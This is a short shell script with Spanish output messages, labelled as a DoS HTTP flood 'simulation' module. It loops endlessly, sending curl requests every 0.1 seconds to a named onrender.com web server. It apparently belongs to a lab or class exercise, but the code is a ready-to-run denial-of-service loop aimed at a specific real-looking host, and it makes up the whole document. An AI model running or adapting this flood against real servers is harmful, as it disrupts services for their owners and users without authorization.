#!/bin/sh
TARGET_URL="https://servidor-web-dmz-mariano-molina.onrender.com"

echo "[+] Iniciando modulo de simulacion DoS HTTP Flood contra: $TARGET_URL"
while true; do
    echo "[*] Enviando ráfaga de peticiones HTTP..."
    curl -s -o /dev/null -w "%{http_code}\n" "$TARGET_URL"
    sleep 0.1
done
